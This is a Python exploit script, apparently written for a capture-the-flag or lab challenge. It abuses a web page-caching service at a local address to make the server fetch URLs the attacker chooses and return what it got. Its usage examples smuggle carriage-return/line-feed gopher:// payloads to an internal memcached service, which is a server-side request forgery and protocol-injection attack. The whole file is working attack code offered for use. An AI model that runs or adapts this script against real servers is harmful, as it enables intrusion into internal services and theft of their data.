#!/usr/bin/env python3
import requests
import re
import sys
import json
import urllib.parse

class WaybackExploit:
    def __init__(self, base_url="http://127.0.0.1:11201"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session_id = None
    
    def get_session(self):
        """Initialize session by making a request to get PHPSESSID"""
        try:
            with open("session_id.txt", "r") as f:
                self.session_id = f.read().strip()
                self.session.cookies.set('PHPSESSID', self.session_id)
                print(f"[+] Loaded session ID from file: {self.session_id}")
                return True
        except FileNotFoundError:
            pass
        try:
            response = self.session.get(self.base_url)
            if 'PHPSESSID' in self.session.cookies:
                self.session_id = self.session.cookies['PHPSESSID']
                print(f"[+] Got session ID: {self.session_id}")
                with open("session_id.txt", "w") as f:
                    f.write(self.session_id)
                return True
        except Exception as e:
            print(f"[-] Failed to get session: {e}")
        return False
    
    def post_debug(self, url_value):
        """POST to /debug to check what url and session id the server receives"""
        json_body = {"url": url_value}
        headers = {'Content-Type': 'application/json'}
        try:
            response = self.session.post(
                f"{self.base_url}/debug",
                data=json.dumps(json_body),
                headers=headers
            )
            print(response.text)
            return response.text
        except Exception as e:
            print(f"[-] Error posting to /debug: {e}")
            return None

    def fetch_url(self, target_url):
        """Submit URL (already encoded if needed) to be cached and return the page ID"""
        # Use the target_url exactly as provided
        json_body = {"url": target_url}
        headers = {'Content-Type': 'application/json'}
        
        try:
            response = self.session.post(
                f"{self.base_url}/pages",
                data=json.dumps(json_body),
                headers=headers,
                allow_redirects=False  # Don't follow redirects automatically
            )
            
            # print(f"[*] POST /pages response: {response.status_code}")
            
            if response.status_code == 302:
                location = response.headers.get('Location')
                if location:
                    match = re.search(r'/pages/([a-f0-9]{24})$', location)
                    if match:
                        page_id = match.group(1)
                        # print(f"[+] Successfully cached! Page ID: {page_id}")
                        return page_id
                    else:
                        print(f"[-] Invalid redirect location: {location}")
                else:
                    print("[-] No location header in redirect")
            
            elif response.status_code == 400:
                print(f"[-] Bad request (400): {response.text}")
            
            elif response.status_code == 500:
                print(f"[-] Server error (500): {response.text}")
            
            else:
                print(f"[-] Unexpected response {response.status_code}: {response.text}")
                
        except Exception as e:
            print(f"[-] Error submitting URL: {e}")
        
        return None
    
    def get_cached_content(self, page_id):
        """Retrieve cached content by page ID"""
        try:
            response = self.session.get(f"{self.base_url}/pages/{page_id}")
            
            if response.status_code == 200:
                # print(f"[+] Successfully retrieved cached content ({len(response.text)} bytes)")
                return response.text
            
            elif response.status_code == 404:
                print("[-] Page not found (session mismatch or invalid ID)")
            
            else:
                print(f"[-] Error retrieving page: {response.status_code} - {response.text}")
                
        except Exception as e:
            print(f"[-] Error retrieving content: {e}")
        
        return None
    
    def exploit(self, target_url):
        """Submit URL and retrieve cached content"""
        print(f"[*] Targeting: {target_url}")
        
        if not self.get_session():
            return None
        
        page_id = self.fetch_url(target_url)
        if not page_id:
            return None
        
        content = self.get_cached_content(page_id)
        return content

def main():
    # Usage:
    #   python3 wayback-capture.py <target_string> [base_url] [output_path] [--raw]
    if len(sys.argv) < 2:
        print("Usage: python3 wayback-capture.py <target_string> [base_url] [output_path] [--raw]")
        print("\nExamples:")
        print("  python3 wayback-capture.py 'hello world\\r\\nnext line'")
        print("  python3 wayback-capture.py 'gopher://memcached:11211/_stats\\r\\nquit'")
        print("  python3 wayback-capture.py 'gopher://memcached:11211/_stats\\r\\nquit' http://127.0.0.1:11201 out.txt --raw")
        sys.exit(1)
    
    raw_input = sys.argv[1]
    raw_input = raw_input.replace('\\r', '\r').replace('\\n', '\n')
    target_url = urllib.parse.quote(raw_input, safe=':/?&=#%')
    base_url = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else "http://127.0.0.1:11201"
    output_path = sys.argv[3] if len(sys.argv) > 3 and not sys.argv[3].startswith('--') else None
    show_raw = '--raw' in sys.argv

    exploit = WaybackExploit(base_url)
    content = exploit.exploit(target_url)
    
    if content:
        print("\n" + "="*50)
        print("CACHED CONTENT:")
        print("="*50)
        if show_raw:
            print(content.encode('utf-8'))
        else:
            print(content)
        print("="*50)
        
        if output_path:
            try:
                with open(output_path, 'wb' if show_raw else 'w', encoding=None if show_raw else 'utf-8') as f:
                    f.write(content.encode('utf-8') if show_raw else content)
                print(f"[+] Content saved to: {output_path}")
            except Exception as e:
                print(f"[-] Failed to save file: {e}")
    else:
        print("[-] Failed to retrieve content")

if __name__ == "__main__":
    main()